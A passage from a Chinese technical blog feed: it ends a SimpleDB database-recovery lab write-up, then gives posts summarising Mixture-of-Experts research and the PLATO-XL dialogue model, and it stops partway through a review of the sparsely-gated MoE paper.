<li>Type 标识了日志的类型，有事务开始、更新数据、创建检查点、事务提交、事务中止五种</li>
<li> tid 标识了事务的 ID</li>
<li>additional info 记录了额外的数据，只有更新数据、创建检查点时存在。
<ol type="1">
<li>更新数据时，保存修改前后的页面数据</li>
<li>创建检查点时，保存此时所有未结束的事务，及其在日志中的第一条日志的偏移</li>
</ol></li>
<li> offset 记录了该条日志的起始在文件中的偏移</li>
</ol></li>
</ol>
<p>从代码注释可以看出，在事务中止，释放其锁之前，会调用 <code>logAbort()
-&gt;
rollback()</code> 方法，撤销该事务的操作，并在日志中留下一条 ABORT 记录。这是需要注意的。</p>
<h3 id="rollback">Rollback</h3>
<p>首先要实现的 <code>rollback(tid)</code> 方法，回滚被中止掉的事务的操作。前面提到，回滚需要倒序扫描日志。不过实验报告中描述的是从事务开始扫描，并提供了 <code>tidToFirstLogRecord</code> 的 Map 来把事务映射到日志第一条记录。所以我按从头开始扫描实现的。从头扫描要注意不要重复地回滚页面，需要维护一个 Set，记录哪些页面已经被回滚过了，再次遇到就直接跳过。</p>
<h3 id="recover">Recover</h3>
<p>故障恢复则相对复杂一些。它包含三个步骤</p>
<ol type="1">
<li>重建检查点（如果存在检查点的话），重建运行中的事务，日志偏移的 Map 映射，即 <code>tidToFirstLogRecord</code></li>
<li>从检查点（或文件开始），逐个地重做日志操作</li>
<li>到日志结束到达崩溃点时，回滚此时还在运行的事务</li>
</ol>
<p>首先，为什么可以安全地从检查点加载开始呢？因为在记录检查点的 <code>logCheckpoint</code> 方法中，调用 <code>flushAllPages()</code> 将 BufferPool 中的脏页面全部写回了磁盘。所以检查点对应的 BufferPool 中是没有脏页面的，可以安全地作为起始点。</p>
<p>其次，在重做日志中，需要注意以下事项：</p>
<ul>
<li>维护 <code>tidToFirstLogRecord</code>，因为它会影响最后回滚日志的逻辑，需要在事务开始、提交、中止时维护其状态</li>
<li><strong>需要重做 ABORT</strong>。即对于日志中的 <code>ABORT
tid</code> 的记录，需要重做，即将其回滚。</li>
</ul>
<p>重做 ABORT 听上去与之前的 ARISE 算法有些矛盾。因为 ARISE 是先重做再回滚的，这里为什么在重做的中间就回滚了事务呢？事实上，这里需要区分两种要回滚的事务：</p>
<ol type="1">
<li>日志中正常输出 ABORT 的事务：可能是因为死锁等原因中止。SimpleDB 强制这些事务中止前调用了 <code>logAbort</code> 方法，回滚操作且写到日志中。</li>
<li>崩溃时意外中止的事务：这些事务在日志中只有开始记录，没有 COMMIT 或者 ABORT 记录</li>
</ol>
<p>理解了这两者的区别，就会发现真正需要在 ARISE 第三阶段回滚的，是第二类的事务。第一类的事务是正常的回滚，在重做时，需要同样回滚才能保持后续的状态一致。</p>
<h2 id="总结">总结</h2>
<p>数据库的恢复是个非常复杂的过程，本人上述的理论知识也省去了一些篇幅。SimpleDB 也对恢复过程做了简化，但这两个 Exercise 也还是 “五脏俱全” 的，包含了各种日志类型、检查点、重做和撤销等核心要点。</p>
<p>到这里，SimpleDB 的 6 个 Lab 就正式结束了。这个实验课程的质量真的很高，从底层的磁盘文件逐步地构建一个数据库系统，过程中做了很多简化以避免过于复杂的无聊操作，保留了精华的重点难点。独立地完成这个实验课，真的能让人学到很多。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>MoE 相关工作、研究进展总结</title>
    <url>/blog/2022/07/03/MoE-Summary/</url>
    <content><![CDATA[<h1 id="moe">MoE</h1>
<p>今天总结一下最近读过的 MoE 相关的论文、研究进展。</p>
<h2 id="简介">简介</h2>
<p>混合专家网络（<strong>Mixture-of-Experts，MoE</strong>），旨在通过条件计算增加模型容量。具体来说，是对不同的输入激活网络中的不同部分，在控制运算量，即 FLOPs 不变的前提，显著增加模型参数，以达到增加容量的效果。这是一种稀疏网络架构，网络中只有部分参数被激活，与之对应的是传统的密集网络，每个输入都会激活所有参数。</p>
<span id="more"></span>
<p>一个例子如下所示。存在 n 个不同的专家，每个专家都是个独立的 FFN，不共享参数。门控网络对每个 token 计算专家网络上的概率分布，取 top2 专家输出的加权和作为 MoE 层的输出。</p>
<p><img src="architecture.png"></p>
<p>实现和训练过程中需要注意以下事项：</p>
<h3 id="稀疏噪声top-k门控">稀疏噪声 Top-k 门控</h3>
<p>计算 logits 时加入随机噪声，使得每个专家都有激活的机会。</p>
<p>将 Top-k 之外的 logits 置 0，降低 softmax 开销。</p>
<h3 id="负载均衡">负载均衡</h3>
<p>门控网络倾向于为特定的少数专家提供较大的权重。事实上，刚开始受到关注的某些专家会训练地更快，从而会更容易被选择。因此，需要额外的损失项保证专家间的负载均衡。</p>
<p>原始论文中使用了专家的重要性（batch 内每个 token 在同一专家的分数之和），构造辅助损失，保证每个专家收到的 batch
token 的重要性相近，又设计了额外的负载损失保证每个专家收到的 token 数量近似。仔细区分的话，重要性损失保证了每个专家都有近似的训练进度，负载损失保证了专家间的负载近似平衡。</p>
<p>下面是重要性损失的公式。负载损失类似。采用这样复杂的损失形式是因为每个专家激活次数是离散量、不可微。</p>
<p><img src="Untitled.png"></p>
<h3 id="混合并行">混合并行</h3>
<p>一般而言，大模型需要分布式数据并行训练。</p>
<p>专家、参数过多时，模型难以容纳在单张卡上。需要做模型并行，将一个或多个专家放在一张卡上，不同的卡保存不同的专家。在门控网络计算完毕，得到每个 token 对应的专家后，通过多卡通信，将每个 token 转移到专家对应的设备上进行计算。</p>
<h3 id="任务数据集">任务 &amp; 数据集</h3>
<ul>
<li>语言模型：百亿 Google News、维基百科</li>
<li> NLU 常见基准：GLUE、SuperGLUE、SQuAD</li>
<li> 摘要：XSum</li>
<li> 问答：CB Web QA、CB Natural QA、CB Trivia QA</li>
<li> 翻译：WMT'14</li>
</ul>
<h3 id="问题">问题</h3>
<ul>
<li><strong>Top-k 门控</strong>：K 过大会增加通信开销，过小又可能损失性能（缺乏了多位专家的对比）</li>
<li><strong>负载均衡</strong>：辅助损失形式复杂，且引入了额外的优化目标</li>
<li><strong>模型并行</strong>：分布式模型并行需要编程上的模型划分、通信、带来额外工程开销</li>
<li><strong>训练稳定性</strong>：稀疏模型可能存在训练不稳定，即 loss 发散的问题</li>
<li><strong>难以推理部署</strong>：稀疏大模型需要大量设备才能推理部署</li>
</ul>
<h2 id="switch-transformer">Switch Transformer</h2>
<ul>
<li>多语任务上，取得了相较于密集 T5-XXL 4x 的加速</li>
</ul>
<h3 id="门控网络">门控网络</h3>
<ul>
<li>主张：原始论文中认为至少需要激活两名专家才能学习到专家间的差异，才能使训练有效。论文主张只使用一个专家，既保证了质量又简化了路由计算，性能更好。</li>
<li>使用 Top1 门控，降低通信开销。</li>
</ul>
<h3 id="负载均衡-1">负载均衡</h3>
<ul>
<li>动机：简化负载均衡辅助损失，为 tpu 训练，固定专家的最大容量</li>
<li>使用容量因子静态设置专家容量，溢出的 token 不激活任何专家，退化为残差连接。</li>
<li>简化辅助损失：使用每个专家分到的 token 比例、重要性的点积构造简化版的辅助损失。</li>
</ul>
<p>N 为专家数，T 为 token 数，<span class="math inline">\(\mathcal
B\)</span> 为 batch 内的所有 token，<span class="math inline">\(f_i\)</span> 为每个专家分到的 token 比例，<span class="math inline">\(P_i\)</span> 为归一化的专家重要性。理想情况下，二者均应该为<span class="math inline"> \(1/N\)</span>。虽然<span class="math inline"> \(f_i\)</span> 不可微，但是<span class="math inline"> \(P_i\)</span> 是可微的。论文称该损失在均匀分布下是最小的。</p>
<p><img src="Untitled%201.png"></p>
<h3 id="蒸馏">蒸馏</h3>
<ul>
<li>动机：将大型稀疏模型蒸馏为小型密集模型</li>
<li>使用密集模型初始化非专家参数</li>
<li>使用 25% 教师概率 + 75% 真实标签混合蒸馏</li>
<li> 5% 的参数保留 30% 的质量</li>
</ul>
<h3 id="稳定性">稳定性</h3>
<ul>
<li>仅将路由器内部的计算使用 float32 精度，其余使用 bfloat16 不变，兼顾稳定性和效率</li>
<li>降低参数初始化的标准差，更稳定</li>
<li>仅提高专家网络的 dropout，避免过拟合。如果增加所有参数的 dropout 会损害性能。</li>
</ul>
<h2 id="hash-layers"><strong>Hash Layers</strong></h2>
<ul>
<li>在两个数据集上困惑度优于 Switch Transformer 约 0.5。</li>
</ul>
<h3 id="负载均衡-2">负载均衡</h3>
<ul>
<li>动机：不使用辅助损失达到负载均衡</li>
<li>通过随机 Hash、聚类 Hash、分散 Hash 多种方法，将建立 token - 专家间的固定 Hash 关系</li>
<li>使用多头 Hash：将专家和 embedding 分段，做 Hash、计算后再拼接到一起</li>
</ul>
<p><img src="Untitled%202.png"></p>
<h2 id="base-layers"><strong>BASE Layers</strong></h2>
<h3 id="负载均衡-3">负载均衡</h3>
<ul>
<li>动机：不使用辅助损失达到负载均衡</li>
<li>将负载均衡问题定义为线性分配问题，每个 token 和 expert 点积计算分数，将分数认作将 token 分配个 exper 的收益，按照成熟的线性分配算法求解。为避免专家、token 过多时求解全局最优的开销过大，论文并将其 token 分成若干个组，求解组内的线性分配问题。</li>
<li>线性分配问题形如：有 n 个 token 和 m 个 expert，矩阵元素 A (n,m) 是将 token
n 分配给专家 m 得到的收益。满足每个专家分配 token 个数相等时，最高收益的分配方案。</li>
<li>需要两次 all2all 操作，第一次将 token 映射到随机的 worker，worker 求解组内线性分配问题，第二次 worker 将 token 发送给对应的 expert。</li>
</ul>
<p><img src="Untitled%203.png"></p>
<h2 id="dense-to-sparse-gate"><strong>DENSE-TO-SPARSE GATE</strong></h2>
<h3 id="提高训练效率">提高训练效率</h3>
<ul>
<li>动机：认为专家和稀疏门控的联合训练对模型精度产生负面影响。通过将门控由密集逐渐转为稀疏，将专家和稀疏门的训练解耦</li>
<li>具体是通过调节门控 softmax 的温度，由大而小，将大于某个分数阈值的专家均激活</li>
<li>由于密集训练完毕后，专家间自然地就存在分布不均衡，因此没有采用负载均衡控制算法</li>
<li>结果：
<ul>
<li>同样验证集困惑度，取得比 switch transformer
2x 的训练加速和 1.25x 的 FLOPs 加速</li>
<li>有无负载均衡损失的效果类似，最终专家间负载基本均衡</li>
</ul></li>
</ul>
<p><img src="Untitled%204.png"></p>
<figure>
<img src="Untitled%205.png" alt="有无辅助损失的对比">
<figcaption aria-hidden="true">有无辅助损失的对比</figcaption>
</figure>
<p>有无辅助损失的对比</p>
<h2 id="tricks-for-training-sparse-translation-models"><strong>Tricks
for Training Sparse Translation Models</strong></h2>
<ul>
<li>在两个数据集上改善了低资源任务的性能</li>
</ul>
<h3 id="多任务学习">多任务学习</h3>
<ul>
<li>动机：大容量的稀疏模型可能会在少资源任务上过拟合。主张这是由于专家很早就开始专业化，很少改变专业化。</li>
</ul>
<figure>
<img src="Untitled%206.png" alt="French为高资源任务，Romanian为低资源语言">
<figcaption aria-hidden="true">French 为高资源任务，Romanian 为低资源语言</figcaption>
</figure>
<p>French 为高资源任务，Romanian 为低资源语言</p>
<ul>
<li>温度采样：训练过程中，按不同温度采样不同任务样本，逐渐加热温度，增大从低资源任务采样数据的比例</li>
<li>密集预训练：刚开始时固定步数内，专家参数共享进行密集预训练，提高了收敛性</li>
</ul>
<figure>
<img src="Untitled%207.png" alt="专家的过早专业化现象得到了遏制">
<figcaption aria-hidden="true">专家的过早专业化现象得到了遏制</figcaption>
</figure>
<p>专家的过早专业化现象得到了遏制</p>
<h2 id="efficient-large-scale-language-modeling-with-mixtures-of-experts"><strong>Efficient
Large Scale Language Modeling with Mixtures of Experts</strong></h2>
<p>关于自回归 MoE 语言模型各种设置的实证研究。</p>
<p>一些结论：</p>
<ul>
<li>相同验证集性能下，MoE 比相同 FLOPs 的密集模型训练速度更快，对域内验证数据快 8-16 倍，域外数据快 2-4 倍。</li>
<li>MoE 的零样本学习能力优于密集模型，但差距随着训练推进减小</li>
<li> MoE 从零样本到少样本间取得的性能提升差于密集模型</li>
<li> MoE 的微调性能差于密集模型，且在部分数据集上存在微调后性能变差的情况</li>
</ul>
<h3 id="稳定性-1">稳定性</h3>
<p>没有像 Switch
Transformer 一样调整初始化的权重，而是增大了每个 expert 的学习率。因为与密集的数据并行相比，每个专家接收到的 token
batch 减少了 E 倍，进而将梯度减小了<span class="math inline"> \(\sqrt
E\)</span> 倍。E 为专家数量。因此论文主张将学习率增大<span class="math inline"> \(\sqrt E\)</span> 倍。</p>
<h2 id="gshard">GShard</h2>
<ul>
<li>一个模块，用户使用 api 为关键张量添加注释，模块会自动实现切分和并行，避免人工编程实现的工程开销。将模型设计和实现分离。</li>
<li>使用 SPMD 而非 MPMD，降低设备增多时的编译开销</li>
</ul>
<h2 id="deepspeed-moe">DeepSpeed-MoE</h2>
<p>提供了端到端的 MoE 训练和推理的解决方案，作为 DeepSpeed 库的一部分，支持最高 3.7 倍的 MoE 压缩，7.3 倍的推理优化。</p>
<p>提出了金字塔残差 MoE（PR-MoE），以更少的参数取得了比传统 MoE 更优的性能。</p>
<h3 id="压缩参数">压缩参数</h3>
<p>实验证明，网络深层使用专家效果优于浅层，因此，论文提出由浅至深逐渐增加专家的数量。也就是金字塔型。</p>
<h3 id="近似top2">近似 Top2</h3>
<p>Top2 门控虽然能带来收益，但是引入了很多训练、通信开销。论文认为，top2 门控优于 top1 门控的原因是，分数第二大的专家<strong>有时</strong>可以纠正第一个专家的错误。因此，论文提出了可以固定一个专家，从剩下的专家里选择最优的。换而言之，在专家之外添加了一个所有 token 都需要经过的 MLP，近似得到 top2 门控的性能。</p>
<p><img src="Untitled%208.png"></p>
<h3 id="蒸馏稀疏模型">蒸馏稀疏模型</h3>
<ul>
<li>将知识蒸馏到专家更少的稀疏模型里，而非传统的密集模型，保留稀疏模型训练和推理的优势</li>
<li>蒸馏过程中逐渐减小蒸馏的影响，避免损害性能</li>
</ul>
<figure>
<img src="Untitled%209.png" alt="完全使用KD损失会在训练近结束时损失性能">
<figcaption aria-hidden="true">完全使用 KD 损失会在训练近结束时损失性能</figcaption>
</figure>
<p>完全使用 KD 损失会在训练近结束时损失性能</p>
<h2 id="st-moe">ST-MoE</h2>
<p>旨在解决 MoE 训练过程中的不稳定性以及微调过程中的质量不确定性。</p>
<p>论文提出了一个 269B 的稀疏模型，实现了 SOTA</p>
<h3 id="稳定性-2">稳定性</h3>
<p>论文尝试了三种常见的提高训练稳定性的方法：</p>
<ul>
<li>移除乘法交互：去除均方根尺度参数、GEGLU 激活</li>
<li>添加噪声</li>
<li>梯度裁剪</li>
</ul>
<p>虽然能够提升稳定性， 但均会损害模型质量</p>
<p>论文提出了一种路由 z-loss，约束梯度，其中，B 是 batch 中 token
数量，N 是专家的数量，</p>
<p>x 是路由器接收的 logits。该 loss 惩罚了门控网络中的大的 logits，类似
l2 正则项。</p>
<p><img src="Untitled%2010.png"></p>
<p>路由 z-loss 能提升稳定性，还能稍微改善模型质量。</p>
<h3 id="微调">微调</h3>
<ul>
<li>论文认为，稀疏模型微调效果差的原因是其倾向于过拟合。实验也证明，稀疏模型更快微调收敛，证实稀疏模型在数据分布变化时可以高效地适应优化。大任务上微调可以取得比密集模型更性能，但是在较小的任务上差于密集模型</li>
</ul>
<p><img src="overfit.png"></p>
<ul>
<li>调节 expert 的 dropout 可提升泛化性能</li>
<li> MoE 只微调非专家参数和微调所有参数性能类似。只微调非专家参数可以加速训练、减小显存。</li>
<li>密集模型和 MoE 的最优微调超参有较大差别，直接影响最后性能，不能直接照搬。</li>
</ul>
<h3 id="丢弃token健壮性">丢弃 token 健壮性</h3>
<p>微调质量不会因为 10% 的 token
丢弃率受到显著性能影响。负载不平衡可能不会显着影响模型质量。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>条件计算</category>
      </categories>
      <tags>
        <tag>条件计算</tag>
        <tag>门控</tag>
        <tag>MoE</tag>
      </tags>
  </entry>
  <entry>
    <title>PLATO-XL</title>
    <url>/blog/2022/02/19/PLATO-XL/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>PLATO-XL 是百度于 2021 年发布的论文《PLATO-XL: Exploring the Large-scale
Pre-training of Dialogue
Generation》中提出的模型，旨在探索大规模预训练对话生成任务的效果，在中英文的多项对话任务上取得了 SOTA。目前，百度提供了<code>百度PLATO</code> 微信公众号服务，可供试用。经笔者测试，PLATO 的效果要远优于微软小冰。因此今天来读下这篇论文。</p>
<span id="more"></span>
<p>下图是微信公众号二维码，大家可以自行体验。</p>
<p><img src="QR.png"></p>
<h2 id="简介">简介</h2>
<p>近些年来，预训练模型的共识是更大的模型 + 更好的数据 = 更好的效果。但是，在对话预训练领域，DialoGPT 的 345M 版本要优于 762M，Blender 的 2.7B 版本要优于 9.4B 的版本，这些反常的现象让人怀疑模型的规模和生成效果是否有清晰的结论关系。本论文指出，对话质量可能还是受益于模型规模，前提是合适的预训练设计。</p>
<p>PLATO-XL 使用 unified
Transformer 的架构进行训以提高参数效率，并实行了” 多角色意识预训练 “用于区分人物信息。据论文所述，多角色意识预训练能够显著减少多轮对话中的不一致性。论文的英文模型和推理脚本开源在了 <a href="https://github.com/PaddlePaddle/Knover/tree/develop/projects/PLATO-XL">github</a> 上，没有开源训练脚本、中文模型等。这很百度。</p>
<p>实验结果表明，PLATO-XL 不仅在开放域闲聊任务取得了 SOTA，也可用于微调后应用于任务型对话、知识增强对话场景，同样取得了 SOTA 效果。</p>
<h2 id="plato-xl">PLATO-XL</h2>
<h3 id="网络结构">网络结构</h3>
<p>PLATO-XL 的架构如下图所示，使用 Unified
Transformer 的 Seq2Seq 的训练方法。将输入和输出以 [SEP] 间隔，输入内部计算双向 self-attention，输入 - 输出间存在 cross-attention，输出间为单侧的 mask-attention。这种做法的优点是参数利用率高，同一套参数即用来编码又用来解码，得到的模型的泛用性也强。</p>
<p><img src="architecture.png"></p>
<h3 id="多角色意识预训练">多角色意识预训练</h3>
<p>这个名字听着很玄乎，其实思想很简单。从社交媒体中搜集的数据一般如下图所示。多个用户的连续回帖构成了多轮对话。但是由于每个人的性格、观念等的不同，直接拿去训练多轮对话容易产生不一致性。因此 PLATO 引入了角色嵌入（role
embedding）来解决这个问题，将角色嵌入和句子向量相加即可。如上面的图所示。</p>
<p><img src="multiparty.png"></p>
<h3 id="预训练设置">预训练设置</h3>
<p>数据集：</p>
<ul>
<li>英文：来自 Reddit，由第三方收集公开于 pushshift.io 上，使用 PLATO-2 的精细清洗流程。训练集为 2005 年到 2019 年的 811M 个样本。词汇表包含 8k
BPE token，使用 SentencePiece 构建。</li>
<li>中文：数据集来自社交媒体，清洗后包含 1.2B 训练样本，词表包含 30k BPE
token。</li>
</ul>
<p>PLATO-XL
拥有 11B 参数，使用了 72 个 Transformer 和 32 个注意力头，嵌入维度为 3072，前馈层的隐藏状态为 18432。为了训练的稳定性，PLATO-XL 参考 GPT2 将 Layer
Normalization 提前到块开始，并对残差层初始参数进行缩放<span class="math inline"> \(*1/\sqrt N\)</span>，N 为残差层数量。</p>
<p>PLAOT-XL 基于飞桨实现，使用了 256 块 32G
V100 进行训练。受限于显存，11B 模型无法容纳在单张卡中，标准的数据并行无法进行。因此将优化器状态、梯度、参数分别保存在不同设备，以减少通信并提高计算效率。为了提高 batch
size，论文还使用了梯度检查点，即不保存一部分前向过程中的激活值，在反向传播时重新计算，用时间换空间。</p>
<h2 id="实验">实验</h2>
<h3 id="基线">基线</h3>
<ul>
<li>DialoGPT：Reddit 评论， 345M 参数。</li>
<li>Blender：Reddit 评论预训练 + 人工注释对话数据（BST）微调，2.7B 参数。</li>
<li>PLATO-2：使用课程学习方法训练。英文：Reddit 评论 + BST 微调，1.6B 参数。中文：1.2B 社交媒体数据集，336M 参数。</li>
<li>CDial-GPT：LCCC 数据集，95.5M 参数。</li>
<li>ProphetNet-X：豆瓣数据集，379M 参数。</li>
<li>EVA：1.4B 数据，2.8B 参数。</li>
</ul>
<p>此外，论文还与公开的中文聊天机器人：微软小冰、图灵机器人、天猫精灵、小爱同学进行了对比。</p>
<h3 id="评估指标">评估指标</h3>
<p>在开放域对话中，自动化指标和人工平板的相关性很小，因此论文主要通过众包平台进行人工评估。</p>
<ul>
<li>连贯性（Coherence）：话语级指标，回复是否与上下文相关和一致。</li>
<li>信息性（Informativeness）：话语级指标，给定上下文的情况下，回复是否有信息。</li>
<li>参与度（Engagingness）：会话级指标，用户是否愿意与机器人持续聊天。</li>
</ul>
<p>上述三个指标取值为 [0,1,2]，分数越高越好。为了进一步分析对话质量，还有两个更细粒度的评估指标：</p>
<ul>
<li>不一致性（Inconsistency）：细粒度评估连贯性，回复是否与上下文冲突。</li>
<li>错觉（Hallucination
）：细粒度评估信息性，回复是否存在事实性错误。</li>
</ul>
<p>这两项指标取值为 [0,1]，越小越好。</p>
<h3 id="实验结果">实验结果</h3>
<p>实验结果如下图所示。可以看到 PLATO-XL 在所有指标上都是最优的。但是仅看中文指标，PLATO-XL 和 PLATO-2 的差别却不大，数据规模均为 1.2B，二者可能使用的是同一套数据集。二者的主要差别在不一致性和错觉这两项指标上，其他三项指标差距均不足 0.1，但模型规模差了 30 倍。</p>
<p>另一个角度看，PLATO-2 是 2020.1 登录 arxiv，EVA 是 2021.10 登录 arxiv，相差近两年，EVA 的模型和数据集的规模都大于 PLATO-2，在论文中表现却全线弱于 PLATO-2。不过 EVA 论文中也未与 PLATO-2 直接比较。这就比较微妙了，要么是 PLATO 的 UniLM 框架要优于 EVA 的 Seq2Seq，要么就是 PLATO 的数据集质量更好。</p>
<p><img src="experiment-result.png"></p>
<p><img src="chat-result.png"></p>
<h3 id="case-study">Case Study</h3>
<p>论文给出了一个对话样例。大家也可以自行去微信公众号体验。</p>
<p><img src="case-study.png"></p>
<p>下面这张图是网上的体验图，可以看到基本可以达到以假乱真的地步。我自己试用的过程中，也激发了 PLATO 的四川话属性。相较于微软小冰，对话质量和体验提升可以说是巨大的。</p>
<p><img src="demo.png"></p>
<h3 id="其他对话任务">其他对话任务</h3>
<p>将 PLATO-XL 微调后用于任务型对话和知识增强对话，在三个数据集上达到了 SOTA 效果，证实了 PLATO-XL 作为对话 AI 的基础模型的潜力。</p>
<p><img src="other-task.png"></p>
<h2 id="总结">总结</h2>
<p>PLATO-XL 的效果确实是非常惊艳，但是代码、数据、模型全部闭源，就 emmmm。模型出于商业角度不开源，数据出于知识产权角度不开源，这篇论文最大的影响就是证实了中文闲聊场景大模型的上限是很高的，但是怎么达到这个上限，我不告诉你。</p>
<p>英文模型反倒可以开源，毕竟百度也不做国外的生意，开源英文模型和推理脚本，论文应该才更容易接收。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://ai.baidu.com/support/news?action=detail&amp;id=2630&amp;hmpl=yunying=10.22">「比人还会聊天」百度 PLATO 对话机器人开放体验
- https://ai.baidu.com/</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话生成</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>对话生成</tag>
        <tag>Transformer</tag>
        <tag>闲聊</tag>
        <tag>PLATO</tag>
      </tags>
  </entry>
  <entry>
    <title>MoE：通过条件计算增加模型容量</title>
    <url>/blog/2022/06/05/MoE/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>今天来读一篇关于条件计算的论文，《<strong>Outrageously Large Neural
Networks: The Sparsely-Gated Mixture-of-Experts
Layer</strong>》，收录于 2017 年 ICLR。神经网络模型的容量（
capacity），例如模型从语料中学习的知识，受限于模型的参数规模。通常，每个样本都要经历到模型所有参数的计算中。增加模型容量意味着成比例的计算性能下降。本文提出了一种条件计算的方法，对每个样本只激活部分参数，可以在不成比例地增加计算量的情况下显着增加模型容量，实现了超过 1000 倍的容量提升，在大型语言建模和机器翻译基准上，这些模型以更低的计算成本实现了新的 SOTA。</p>
<span id="more"></span>
<p>具体而言，论文引入了稀疏门控混合专家层（MoE，Sparsely-Gated
Mixture-of-Experts
Layer），由前馈神经网络和门控网络组成。门控网络用于选择专家的稀疏组合，处理每个输入。网络的所有部分都通过反向传播联合训练。</p>
<h2 id="介绍">介绍</h2>
<p>正如前文所说，模型的容量受限于参数规模，简单扩大参数会导致训练成本大致呈二次增长。条件计算基于每个样本选择网络的不同部分激活。用于选择的门控决策可以是二元的、稀疏的、连续的、随机的或确定的。各种形式的强化学习和反向传播策略可用于训练门控决策。然而，该方法面临很多的挑战：</p>
<ul>
<li><strong>分支低效</strong>：计算设备，尤其 GPU，计算要比分支快得多。熟悉流水线 CPU 的同学应该知道，分支的分支错误惩罚会导致数个时钟周期的停顿，严重影响计算效率</li>
<li><strong>批大小受限</strong>：条件计算减少了网络条件活动块的 batch
size</li>
<li><strong> 网络带宽（IO）受限</strong>：GPU 的计算能力往往是网络带宽的数千倍，嵌入层，也可以看做一种条件计算，往往需要网络发送，这种参数交互受到网络带宽而非计算能力的限制</li>
<li><strong>额外损失项</strong>：可能需要额外的损失项控制每个样本的网络稀疏程度，在模型负载和质量间做出平衡。</li>
<li><strong>大规模数据的依赖</strong>。模型容量的扩大需要大规模数据集训练，现有的一些条件计算工作只使用了最多 60w 数据，难以为万亿计参数的模型提供足够的监督信号。</li>
</ul>
<p>论文提出的稀疏门控专家层 MoE，由许多专家组成，每个专家都是一个简单的前馈神经网络，以及一个可训练的门控网络，该网络选择专家的稀疏组合来处理每个输入。结构图示意如下，其中门控网络从中选择了两个，处理样本。</p>
<p><img src="architecture.png"></p>
<p>虽然技术是通用的，但论文主要关注在语言模型、机器翻译任务上，这些任务可以从模型规模受益。基于此，论文在堆叠的 LSTM 层上应用了一个 MoE 卷积，如上图所示。对文本的不同位置调用一次 MoE，选择不同的专家组合。不同的专家组合根据语法和语义变得高度专业化。</p>
<h2 id="moe结构">MoE 结构</h2>
<p>MoE 由一个门控网络<span class="math inline"> \(G\)</span>、n 个专家网络<span class="math inline"> \(E_1,E_2,\dots,E_n\)</span> 组成。门控网络的输出是一个<span class="math inline"> \(n\)</span> 维的向量。每个专家都是一个前馈网络，输入和输出的维度一致。用<span class="math inline"> \(G(x),E_i(x)\)</span> 分别代表门控网络、第 i 个专家网络的输出，<span class="math inline">\(x\)</span> 为专家网络的输入。MoE 的输出为专家网络输出的加权和，权重为门控网络对应维度的元素值，公式如下：
<span class="math display">\[
y=\sum_{i=1}^nG(x)_iE_i(x)
\]</span> 稀疏性体现在<span class="math inline"> \(G(x)\)</span> 上，如果<span class="math inline"> \(G(x)_i\)</span> 为 0，就不需要计算<span class="math inline"> \(E_i(x)\)</span> 了。在实验中，有上千个专家网络，但是只需要计算少部分。如果专家的数量过多，可以通过分层 MoE 减少分支。分层 MoE 中，每个专家都是带有自己门控网络的二级专家组合。下面介绍稀疏门控是如何实现的。</p>
<h3 id="softmax-门控">Softmax 门控</h3>
<p>简单的非稀疏门控可以通过 Softmax 函数实现，公式如下： <span class="math display">\[
G_\sigma(x)=Softmax(x\cdot W_g)
\]</span></p>
<h3 id="噪声top-k门控">噪声 Top-k 门控</h3>
<p>在 Softmax 门控网络中，添加稀疏性可提高计算效率，添加噪声可以实现负载均衡，随机性使得每个专家都有激活的机会。具体是通过在取 Softmax 函数前，添加可调高斯噪声，然后只保留前 k 个值，其余置<span class="math inline"> \(-\infty\)</span>，在进行 Softmax 后，对应的门控信号就为 0,。可调高斯噪声，是指标准正态分布的噪声乘以可训练的噪声权重<span class="math inline"> \(Softplus(x\cdot W_{noise})\)</span>。公式如下：
<span class="math display">\[
G(x)=Softmax(KeepTopK(H(x),k))
\]</span> <span class="math display">\[
H(x)_i=(x\cdot W_g)_i+StandardNorm()\cdot Softplus((x\cdot W_{noise})_i)
\]</span> <span class="math display">\[
KeepTopK (v,k)_i=\begin {cases}
v_i,\ 如果 v_i 是前 k 大的元素 \\
-\infty,\ 其他
\end {cases}
\]</span></p>
<h3 id="训练门控网络">训练门控网络</h3>
<p>通过简单的反向传播以及模型的其余部分来训练门控网络。如果选择 k &gt;
1，则前 k
个专家的门值相对于门控网络的权重具有非零导数。梯度通过门控网络反向传播到其输入。</p>
<h2 id="解决性能挑战">解决性能挑战</h2>
<h3 id="批大小缩减">批大小缩减</h3>
<p>大的 batch
size 对于计算效率是非常重要的，能够减小参数加载和更新的开销。如果门控网络每次只从专家网络中选择 k 个，每个专家对应的 batch
size 会小得多，这会使得参数的更新更为低效。虽然这个问题可以通过暴力加大 batch
size 缓解，但这又受限于 GPU 的显存限制。</p>
<p>论文提出了以下两种增加 batch size 的技术：</p>
<p><strong>混合数据并行和模型并行</strong>。传统的数据并行分布式训练中，不同设备上的多个模型副本<strong>异步</strong>处理不同 batch 数据，并通过一组参数服务器同步参数。论文提出同步的数据并行策略，不同设备数据同时组合应用于 MoE 层。模型标准层、门控网络都遵循平常的数据并行设置，不同的是，MoE 的每个专家只保留一份共享副本。每个专家都会收到一个组合批次，该批次包含数据并行中与该专家相关的批次。不同的设备上保存着不同的专家子集。所以这是一种混合数据并行和模型并行的方法。模型并行的设置猜测是为了减少显存开销，大量专家的情况下，每个设备上不激活的专家还是很占显存的。</p>
<p><strong>利用卷积性</strong>。MoE 可以类似卷积操作，施加在每层的不同时间步上应用 MoE，相当于增大了 batch
size。但对于 RNN 此类网络，其自回归性使得卷积操作无法进行。</p>
<h3 id="网络带宽">网络带宽</h3>
<p>分布式计算中另一个主要的性能问题是网络带宽。网络中，专家的输入和输出通过网络发送。为了保持计算效率，专家的计算量与其 IO（输入和输出）的比值必须超过计算设备的计算量与网络容量的比值。对于
GPU，这可能是数千比一。实验中，专家是仅有一个隐藏层的感知机，权重矩阵的大小为
input_size×hidden_size 和
hidden_size×output_size，因此计算与输入和输出的比率等于隐藏层的大小。因此，可以简单地通过使用更大的隐藏层或更多隐藏层来提高计算效率。</p>
<p>其实，也很容易理解，增加内部的计算量当然就相对降低了 IO 开销。</p>
